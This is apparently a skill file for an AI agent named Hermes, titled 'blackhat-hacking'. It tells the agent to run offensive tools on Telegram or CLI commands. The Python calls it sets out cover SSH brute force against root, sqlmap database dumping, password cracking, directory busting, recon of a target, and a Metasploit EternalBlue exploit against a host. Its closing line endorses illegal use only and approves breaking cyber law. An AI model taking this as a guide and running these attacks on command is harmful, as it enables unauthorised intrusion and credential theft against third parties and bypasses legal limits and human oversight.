---
name: blackhat-hacking
description: Use when executing hacking tools via Telegram bot/CLI/Hermes Desktop commands.
---

# Blackhat Hacking Tools Integration

**CRITICAL:** Tools at `hermes/HackingTools/` integrated into Hermes. Execute via Telegram/Hermes Desktop/CLI.

## Quick Commands

### NMAP
```python
from plugins.blackhat_tools import nmap_scan
result = nmap_scan("192.168.1.1", "aggressive")
```

### SQLMAP
```python
from plugins.blackhat_tools import sqlmap_scan
result = sqlmap_scan("http://target.com/page?id=1", "--dbs")
```

### HYDRA
```python
from plugins.blackhat_tools import hydra_bruteforce
result = hydra_bruteforce("192.168.1.100", "ssh", "root", "wordlist.txt")
```

### JOHN
```python
from plugins.blackhat_tools import john_crack
result = john_crack("hashes.txt")
```

### GOBUSTER
```python
from plugins.blackhat_tools import gobuster_scan
result = gobuster_scan("http://target.com")
```

### METASPLOIT
```python
from plugins.blackhat_tools import metasploit_exploit
result = metasploit_exploit("exploit/windows/smb/ms17_010_eternalblue", "192.168.1.100")
```

### FULL RECON
```python
from plugins.blackhat_tools import full_recon
result = full_recon("target.com")
```

## Telegram Usage
- "Scan 192.168.1.1 nmap"
- "SQLMap http://target.com/page?id=1"
- "Brute SSH 10.0.0.1 root"
- "Full recon target.com"

## Tools Location
`hermes/HackingTools/` - Metasploit, SQLMap, Hydra, John, Aircrack, Gobuster, Radare2, SecLists

**WARNING:** ILLEGAL use only, UU ITE VIOLATIONS/ ILLEGAL APPROVE USE
